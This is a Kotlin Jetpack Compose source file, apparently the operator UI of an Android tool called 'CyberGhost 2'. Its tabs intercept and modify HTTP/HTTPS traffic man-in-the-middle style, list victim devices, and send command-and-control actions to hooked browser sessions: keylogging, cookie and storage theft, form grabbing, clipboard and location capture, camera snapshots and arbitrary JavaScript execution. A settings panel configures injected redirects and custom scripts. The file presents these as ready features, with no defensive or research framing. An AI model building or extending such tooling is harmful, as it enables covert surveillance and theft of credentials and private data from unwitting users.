package com.cyberghost.ui

import androidx.compose.animation.animateColorAsState
import androidx.compose.foundation.*
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.TextFieldValue
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.cyberghost.core.*

val Bg = Color(0xFF080808)
val Surface = Color(0xFF111111)
val Green = Color(0xFF00FF41)
val DimGreen = Color(0xFF00AA2A)
val Cyan = Color(0xFF00D4FF)
val Amber = Color(0xFFFFB000)
val Red = Color(0xFFFF3333)
val Magenta = Color(0xFFFF44FF)
val Gray = Color(0xFF555555)
val White = Color(0xFFCCCCCC)
val Mono = FontFamily.Monospace

enum class Tab { INTERCEPT, DEVICES, HOOKED, SETTINGS }

@Composable
fun CyberGhostScreen(
    interceptQueue: List<PendingIntercept>, packets: List<InterceptedPacket>,
    devices: List<ConnectedDevice>, hookedSessions: List<HookedSession>,
    mode: InterceptMode, isRunning: Boolean, events: List<C2Event>,
    onModeChange: (InterceptMode) -> Unit, onToggle: () -> Unit,
    onForward: (String, InterceptedPacket) -> Unit, onDrop: (String) -> Unit,
    onCommand: (String, String, Map<String, Any?>) -> Unit,
    onExportCa: () -> Unit, onConfigUpdate: (InjectionConfig) -> Unit, currentConfig: InjectionConfig
) {
    var activeTab by remember { mutableStateOf(Tab.INTERCEPT) }
    Column(Modifier.fillMaxSize().background(Bg).systemBarsPadding()) {
        TopBar(isRunning, mode, interceptQueue.size, devices.size, hookedSessions.count { it.isAlive }, onToggle, onExportCa)
        TabRow(activeTab) { activeTab = it }
        when (activeTab) {
            Tab.INTERCEPT -> InterceptView(interceptQueue, packets, onForward, onDrop)
            Tab.DEVICES -> DeviceView(devices)
            Tab.HOOKED -> HookedView(hookedSessions, events, onCommand)
            Tab.SETTINGS -> SettingsView(mode, onModeChange, currentConfig, onConfigUpdate)
        }
    }
}

@Composable
fun TopBar(isRunning: Boolean, mode: InterceptMode, pending: Int, deviceCount: Int, hookedCount: Int, onToggle: () -> Unit, onExportCa: () -> Unit) {
    val statusColor by animateColorAsState(if (isRunning) Green else Red, label = "st")
    Row(Modifier.fillMaxWidth().background(Surface).padding(12.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
        Column {
            Text("CYBERGHOST 2", color = Green, fontSize = 15.sp, fontFamily = Mono, fontWeight = FontWeight.Bold)
            Text("${if (isRunning) "\u25CF" else "\u25CB"} ${mode.name}  Q:$pending  D:$deviceCount  H:$hookedCount", color = statusColor, fontSize = 10.sp, fontFamily = Mono)
        }
        Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            TermBtn("CA", Amber, onExportCa)
            TermBtn(if (isRunning) "STOP" else "START", if (isRunning) Red else Green, onToggle)
        }
    }
}

@Composable
fun TabRow(active: Tab, onSelect: (Tab) -> Unit) {
    Row(Modifier.fillMaxWidth().background(Color(0xFF0D0D0D)).padding(4.dp), horizontalArrangement = Arrangement.SpaceEvenly) {
        Tab.entries.forEach { tab ->
            Text(tab.name, color = if (tab == active) Green else Gray, fontSize = 11.sp, fontFamily = Mono,
                fontWeight = if (tab == active) FontWeight.Bold else FontWeight.Normal,
                modifier = Modifier.clickable { onSelect(tab) }.padding(8.dp))
        }
    }
}

@Composable
fun InterceptView(queue: List<PendingIntercept>, history: List<InterceptedPacket>, onForward: (String, InterceptedPacket) -> Unit, onDrop: (String) -> Unit) {
    LazyColumn(Modifier.fillMaxSize().padding(8.dp)) {
        if (queue.isNotEmpty()) {
            item { Text("PENDING (${queue.size})", color = Amber, fontSize = 11.sp, fontFamily = Mono, fontWeight = FontWeight.Bold, modifier = Modifier.padding(bottom = 4.dp)) }
            items(queue) { pending -> InterceptCard(pending.packet, isPending = true, onForward = { modified -> onForward(pending.packet.id, modified) }, onDrop = { onDrop(pending.packet.id) }) }
            item { Spacer(Modifier.height(12.dp)) }
        }
        item { Text("HISTORY", color = DimGreen, fontSize = 11.sp, fontFamily = Mono, modifier = Modifier.padding(bottom = 4.dp)) }
        items(history.takeLast(200).reversed()) { packet -> PacketRow(packet) }
    }
}

@Composable
fun InterceptCard(packet: InterceptedPacket, isPending: Boolean, onForward: (InterceptedPacket) -> Unit, onDrop: () -> Unit) {
    var editedBody by remember { mutableStateOf(TextFieldValue(String(packet.body))) }
    var editedPath by remember { mutableStateOf(TextFieldValue(packet.path)) }
    var expanded by remember { mutableStateOf(true) }
    Card(modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp), colors = CardDefaults.cardColors(containerColor = Color(0xFF1A1A1A)), shape = RoundedCornerShape(6.dp)) {
        Column(Modifier.padding(10.dp)) {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                Text("${packet.direction.name} ${packet.protocol}", color = if (packet.isRequest) Cyan else Amber, fontSize = 11.sp, fontFamily = Mono, fontWeight = FontWeight.Bold)
                Text(packet.sourceIp, color = Gray, fontSize = 10.sp, fontFamily = Mono)
            }
            Row(verticalAlignment = Alignment.CenterVertically) {
                Text("${packet.method ?: ""} ", color = Green, fontSize = 11.sp, fontFamily = Mono, fontWeight = FontWeight.Bold)
                if (isPending) {
                    TextField(value = editedPath, onValueChange = { editedPath = it },
                        textStyle = androidx.compose.ui.text.TextStyle(color = White, fontSize = 10.sp, fontFamily = Mono),
                        colors = TextFieldDefaults.colors(unfocusedContainerColor = Color(0xFF222222), focusedContainerColor = Color(0xFF222222)),
                        modifier = Modifier.fillMaxWidth().height(36.dp), singleLine = true)
                } else {
                    Text("${packet.host}${packet.path}", color = White, fontSize = 10.sp, fontFamily = Mono, maxLines = 1)
                }
            }
            if (expanded && isPending) {
                Spacer(Modifier.height(6.dp))
                packet.headers.entries.take(8).forEach { (k, v) -> Text("$k: ${v.take(60)}", color = Gray, fontSize = 9.sp, fontFamily = Mono) }
                Spacer(Modifier.height(6.dp))
                TextField(value = editedBody, onValueChange = { editedBody = it },
                    textStyle = androidx.compose.ui.text.TextStyle(color = DimGreen, fontSize = 9.sp, fontFamily = Mono),
                    colors = TextFieldDefaults.colors(unfocusedContainerColor = Color(0xFF1A1A1A), focusedContainerColor = Color(0xFF1A1A1A)),
                    modifier = Modifier.fillMaxWidth().heightIn(min = 60.dp, max = 200.dp))
                Spacer(Modifier.height(8.dp))
                Row(horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                    TermBtn("FORWARD", Green) { onForward(packet.copy(path = editedPath.text, body = editedBody.text.toByteArray())) }
                    TermBtn("DROP", Red) { onDrop() }
                }
            }
        }
    }
}

@Composable
fun PacketRow(packet: InterceptedPacket) {
    val color = when { packet.isRequest && packet.protocol == "HTTPS" -> Cyan; packet.isRequest -> Amber; else -> DimGreen }
    Text("${packet.direction.name.take(3)} ${packet.protocol} ${packet.method ?: ""} ${packet.host}${packet.path.take(35)} [${packet.statusCode ?: "-"}]",
        color = color, fontSize = 9.sp, fontFamily = Mono, modifier = Modifier.padding(vertical = 1.dp))
}

@Composable
fun DeviceView(devices: List<ConnectedDevice>) {
    LazyColumn(Modifier.fillMaxSize().padding(8.dp)) {
        items(devices) { device ->
            Card(Modifier.fillMaxWidth().padding(vertical = 3.dp), colors = CardDefaults.cardColors(containerColor = Surface), shape = RoundedCornerShape(6.dp)) {
                Row(Modifier.padding(10.dp).fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                    Column {
                        Text(device.ip, color = Green, fontSize = 12.sp, fontFamily = Mono, fontWeight = FontWeight.Bold)
                        Text("reqs: ${device.requestCount}  bytes: ${device.bytesTransferred / 1024}KB", color = Gray, fontSize = 10.sp, fontFamily = Mono)
                        device.userAgent?.let { Text(it.take(50), color = Gray, fontSize = 9.sp, fontFamily = Mono) }
                    }
                    Text(if (device.isHooked) "HOOKED" else "\u2014", color = if (device.isHooked) Magenta else Gray, fontSize = 10.sp, fontFamily = Mono, fontWeight = FontWeight.Bold)
                }
            }
        }
    }
}

@Composable
fun HookedView(sessions: List<HookedSession>, events: List<C2Event>, onCommand: (String, String, Map<String, Any?>) -> Unit) {
    var selectedSession by remember { mutableStateOf<String?>(null) }
    var jsInput by remember { mutableStateOf(TextFieldValue("")) }
    LazyColumn(Modifier.fillMaxSize().padding(8.dp)) {
        items(sessions.filter { it.isAlive }) { session ->
            Card(Modifier.fillMaxWidth().padding(vertical = 3.dp).clickable { selectedSession = session.sessionId },
                colors = CardDefaults.cardColors(containerColor = if (selectedSession == session.sessionId) Color(0xFF1A1A2A) else Surface), shape = RoundedCornerShape(6.dp)) {
                Column(Modifier.padding(10.dp)) {
                    Text(session.pageUrl.take(50), color = Cyan, fontSize = 10.sp, fontFamily = Mono, fontWeight = FontWeight.Bold)
                    Text("${session.platform} \u00B7 ${session.screenSize} \u00B7 keys: ${session.keylog.size}", color = Gray, fontSize = 9.sp, fontFamily = Mono)
                    if (selectedSession == session.sessionId) {
                        Spacer(Modifier.height(8.dp))
                        FlowRow(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                            CmdBtn("screenshot", Cyan) { onCommand(session.sessionId, "screenshot", emptyMap()) }
                            CmdBtn("keylog:on", Magenta) { onCommand(session.sessionId, "keylog_start", emptyMap()) }
                            CmdBtn("keylog:off", Gray) { onCommand(session.sessionId, "keylog_stop", emptyMap()) }
                            CmdBtn("cookies", Amber) { onCommand(session.sessionId, "get_cookies", emptyMap()) }
                            CmdBtn("storage", Amber) { onCommand(session.sessionId, "get_storage", emptyMap()) }
                            CmdBtn("forms", Red) { onCommand(session.sessionId, "form_grab", emptyMap()) }
                            CmdBtn("clipboard", DimGreen) { onCommand(session.sessionId, "get_clipboard", emptyMap()) }
                            CmdBtn("location", DimGreen) { onCommand(session.sessionId, "get_location", emptyMap()) }
                            CmdBtn("camera", Red) { onCommand(session.sessionId, "camera_snap", emptyMap()) }
                            CmdBtn("dom", Gray) { onCommand(session.sessionId, "get_dom", emptyMap()) }
                        }
                        Spacer(Modifier.height(6.dp))
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            TextField(value = jsInput, onValueChange = { jsInput = it },
                                placeholder = { Text("js>", color = Gray, fontSize = 10.sp) },
                                textStyle = androidx.compose.ui.text.TextStyle(color = Green, fontSize = 10.sp, fontFamily = Mono),
                                colors = TextFieldDefaults.colors(unfocusedContainerColor = Color(0xFF1A1A1A), focusedContainerColor = Color(0xFF1A1A1A)),
                                modifier = Modifier.weight(1f).height(40.dp), singleLine = true)
                            Spacer(Modifier.width(6.dp))
                            TermBtn("RUN", Green) { onCommand(session.sessionId, "exec_js", mapOf("code" to jsInput.text)); jsInput = TextFieldValue("") }
                        }
                        Spacer(Modifier.height(6.dp))
                        events.filter { it.sessionId == session.sessionId }.takeLast(10).reversed().forEach { event ->
                            Text("${event.type}: ${event.data.entries.take(3).joinToString { "${it.key}=${it.value.toString().take(30)}" }}", color = DimGreen, fontSize = 8.sp, fontFamily = Mono)
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun SettingsView(mode: InterceptMode, onModeChange: (InterceptMode) -> Unit, config: InjectionConfig, onConfigUpdate: (InjectionConfig) -> Unit) {
    Column(Modifier.fillMaxSize().verticalScroll(rememberScrollState()).padding(12.dp), verticalArrangement = Arrangement.spacedBy(12.dp)) {
        Text("MODE", color = Green, fontSize = 12.sp, fontFamily = Mono, fontWeight = FontWeight.Bold)
        InterceptMode.entries.forEach { m ->
            Row(Modifier.clickable { onModeChange(m) }.padding(vertical = 4.dp), verticalAlignment = Alignment.CenterVertically) {
                Text(if (mode == m) "\u25C9" else "\u25CB", color = if (mode == m) Green else Gray, fontSize = 14.sp, fontFamily = Mono)
                Spacer(Modifier.width(8.dp))
                Text(m.name, color = White, fontSize = 11.sp, fontFamily = Mono)
            }
        }
        HorizontalDivider(color = Color(0xFF222222))
        Text("INJECTION", color = Amber, fontSize = 12.sp, fontFamily = Mono, fontWeight = FontWeight.Bold)
        ToggleRow("Browser Hook", config.hookEnabled) { onConfigUpdate(config.copy(hookEnabled = it)) }
        ConfigField("Audio URL", config.audioUrl ?: "") { onConfigUpdate(config.copy(audioUrl = it.ifBlank { null })) }
        ConfigField("Video URL", config.videoUrl ?: "") { onConfigUpdate(config.copy(videoUrl = it.ifBlank { null })) }
        ConfigField("Document URL", config.documentUrl ?: "") { onConfigUpdate(config.copy(documentUrl = it.ifBlank { null })) }
        ConfigField("Redirect URL", config.redirectUrl ?: "") { onConfigUpdate(config.copy(redirectUrl = it.ifBlank { null })) }
        ConfigField("Custom JS", config.customJs ?: "") { onConfigUpdate(config.copy(customJs = it.ifBlank { null })) }
    }
}

@Composable
fun TermBtn(label: String, color: Color, onClick: () -> Unit) {
    Text("[$label]", color = color, fontSize = 11.sp, fontFamily = Mono, fontWeight = FontWeight.Bold,
        modifier = Modifier.clip(RoundedCornerShape(4.dp)).clickable(onClick = onClick).padding(horizontal = 6.dp, vertical = 4.dp))
}

@Composable
fun CmdBtn(label: String, color: Color, onClick: () -> Unit) {
    Text(label, color = color, fontSize = 9.sp, fontFamily = Mono,
        modifier = Modifier.clip(RoundedCornerShape(3.dp)).background(Color(0xFF1A1A1A)).clickable(onClick = onClick).padding(horizontal = 6.dp, vertical = 3.dp))
}

@Composable
fun ToggleRow(label: String, checked: Boolean, onChange: (Boolean) -> Unit) {
    Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
        Text(label, color = White, fontSize = 11.sp, fontFamily = Mono)
        Switch(checked = checked, onCheckedChange = onChange, colors = SwitchDefaults.colors(checkedTrackColor = Green, uncheckedTrackColor = Gray))
    }
}

@Composable
fun ConfigField(label: String, value: String, onChange: (String) -> Unit) {
    var text by remember { mutableStateOf(TextFieldValue(value)) }
    Column {
        Text(label, color = Gray, fontSize = 9.sp, fontFamily = Mono)
        TextField(value = text, onValueChange = { text = it; onChange(it.text) },
            textStyle = androidx.compose.ui.text.TextStyle(color = White, fontSize = 10.sp, fontFamily = Mono),
            colors = TextFieldDefaults.colors(unfocusedContainerColor = Color(0xFF1A1A1A), focusedContainerColor = Color(0xFF1A1A1A)),
            modifier = Modifier.fillMaxWidth().height(40.dp), singleLine = true)
    }
}
